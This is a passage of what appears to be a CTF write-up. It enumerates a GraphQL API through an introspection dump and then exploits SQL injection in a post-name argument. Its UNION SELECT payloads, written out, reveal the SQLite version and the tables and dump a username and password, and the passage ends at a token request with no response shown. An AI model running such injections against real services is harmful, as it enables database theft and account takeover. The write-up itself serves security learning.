class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__EnumValue&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A user of our website&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The id of the user&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;id&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Int&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The salted SHA1 hash of the users password&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;password&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The username of the user&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The `Int` scalar type represents non-fractional signed whole numeric values. Int can represent values between -(2^31) and 2^31 - 1. &#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Int&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A cool post written by one of our users&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The writter of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;author&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The content os the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;content&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The id of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;id&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Int&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Image of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;image&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The name of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;args&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;deprecationReason&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;type&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Type&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Field&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}]}}}</span>
</code></pre></div><p>Using GraphQL voyager, the schema can be visualized as follows:</p>
<p>&gt; <strong>Query</strong>:</p>
<p><div class="img-container"><img src="imgs/image-20210917195515613.png" alt="image-20210917195515613"  /></div>
</p>
<p>&gt; <strong>Mutation</strong></p>
<p><div class="img-container"><img src="imgs/image-20211009120159163.png" alt="image-20211009120159163"  /></div>
</p>
<p>From what I understand, Query and Mutation are just like Getter and Setter functions in Java or other Programming languages.</p>
<p>I tried to query the flag with <code>{&quot;query&quot;:&quot;{flag}&quot;}</code>, but it turned out a valid token for authentication is required.</p>
<p>The next thing I tried was to see if I could dump out the author&rsquo;s password with the following query, and I couldn&rsquo;t.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;{ posts {id  name author{username password}} }&#34;</span><span class="p">}</span> 

<span class="err">##</span> <span class="err">resp</span>
<span class="p">{</span>
   <span class="nt">&#34;data&#34;</span><span class="p">:{</span>
      <span class="nt">&#34;posts&#34;</span><span class="p">:[</span>
         <span class="p">{</span>
            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
            <span class="p">},</span>
            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span>
         <span class="p">},</span>
         <span class="p">{</span>
            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
            <span class="p">},</span>
            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span>
            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Grandma&#39;s Yeast Rolls&#34;</span>
         <span class="p">},</span>
         <span class="p">{</span>
            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
            <span class="p">},</span>
            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">3</span><span class="p">,</span>
            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Blackberry-Orange Cake&#34;</span>
         <span class="p">},</span>
         <span class="p">{</span>
            <span class="nt">&#34;author&#34;</span><span class="p">:{</span>
               <span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
               <span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;congon4tor&#34;</span>
            <span class="p">},</span>
            <span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">4</span><span class="p">,</span>
            <span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Apple Pie&#34;</span>
         <span class="p">}</span>
      <span class="p">]</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>Then I tried to overwrite/update the user password with mutation functions (+ space in username, capital, etc), and it also didn&rsquo;t work.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">Query</span> <span class="err">to</span> <span class="err">update</span> <span class="err">pass</span> 
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;mutation {createUser (username: \&#34;Congon4tor\&#34;, password: \&#34;choropys\&#34;) {username password}}&#34;</span> <span class="p">}</span>  
<span class="err">##</span> <span class="err">Query</span> <span class="err">to</span> <span class="err">auth</span> <span class="err">and</span> <span class="err">grab</span> <span class="err">the</span> <span class="err">token</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;mutation {authenticateUser(username: \&#34;Congon4tor\&#34;, password: \&#34;choropys\&#34;) {token}}&#34;</span>
</code></pre></div><h4 id="sql-injection-in-graphql">SQL injection in GraphQL</h4>
<p>Since I was stuck, I started to re-enumerate the web to find something I missed, and then I found a weird behavior in a post titled with <code>Grandma's Yeast Rolls</code>. Only the page for that post is a blank page.</p>
<p>When I looked at the server response in the dev tool, it was revealed that a single quote <code>'</code> in the post title broke the request.</p>
<p><div class="img-container"><img src="imgs/image-20210921025404405.png" alt="image-20210921025404405"  /></div>
</p>
<p>To validate that the site is vulnerable to SQLi,  I tried to send a single post request with the following query:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;Strawberry Cake\&#34;){ name }}&#34;</span><span class="p">}</span>  
</code></pre></div><p>The server responded with the expected result:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span><span class="p">}]}}</span>
</code></pre></div><p>When I changed the request to:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;Grandma&#39; OR 1=1 --\&#34;){ name }}&#34;</span><span class="p">}</span>
</code></pre></div><p>It returned all the posts !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=utf-8</span>
<span class="n">Date</span><span class="o">:</span> <span class="l">Fri, 17 Sep 2021 19:59:19 GMT</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">134</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Strawberry Cake&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Grandma&#39;s Yeast Rolls&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Blackberry-Orange Cake&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Apple Pie&#34;</span><span class="p">}]}}</span>
</code></pre></div><p>With this, I obtained the following information:</p>
<ul>
<li>
<p>There are 6 columns.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; ORDER BY 1,2,3,4,5,6 -- \&#34;){ name }}&#34;</span><span class="p">}</span>  
</code></pre></div></li>
<li>
<p>Injection point is on column 2</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,2,3,4,5,6 -- \&#34;){ name }}&#34;</span><span class="p">}</span> 

<span class="err">##</span> <span class="err">resp</span>
<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;2&#34;</span><span class="p">}]}}</span>
</code></pre></div></li>
<li>
<p>The DB is SQLite</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,sqlite_version(),3,4,5,6 -- \&#34;){ name }}&#34;</span><span class="p">}</span>  

<span class="err">##</span> <span class="err">resp</span>
<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;3.36.0&#34;</span><span class="p">}]}}</span>
</code></pre></div></li>
<li>
<p>There are two tables: <code>posts</code> and <code>users</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,tbl_name ,3,4,5,6  FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; -- \&#34;){ name }}&#34;</span><span class="p">}</span>  

<span class="err">##</span> <span class="err">resp</span>
<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;posts&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;users&#34;</span><span class="p">}]}}</span>
</code></pre></div></li>
</ul>
<p>Based on the voyager views, I assumed that the table has the username and the password columns, so I sent a query to dump these columns, and it was correct.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;query { post(name:\&#34;&#39; UNION SELECT 1,(SELECT username||password FROM users),3,4,5,6 -- \&#34;){ name }}&#34;</span><span class="p">}</span>

<span class="err">##</span> <span class="err">resp</span>
<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;post&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;posts&#34;</span><span class="p">},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;congon4torn8bboB!3%vDwiASVgKhv&#34;</span><span class="p">}]}}</span>
</code></pre></div><p>With these credentials, I can request for a valid token</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="err">##</span> <span class="err">req</span>
<span class="p">{</span><span class="nt">&#34;query&#34;</span><span class="p">:</span><span class="s2">&#34;mutation {authenticateUser(username: \&#34;congon4tor\&#34;, password: \&#34;n8bboB!3%vDwiASVgKhv\&#34;) {token}}&#34;</span><span class="p">}</span> 

<span class="err">##</span> <span class="err">resp</span>
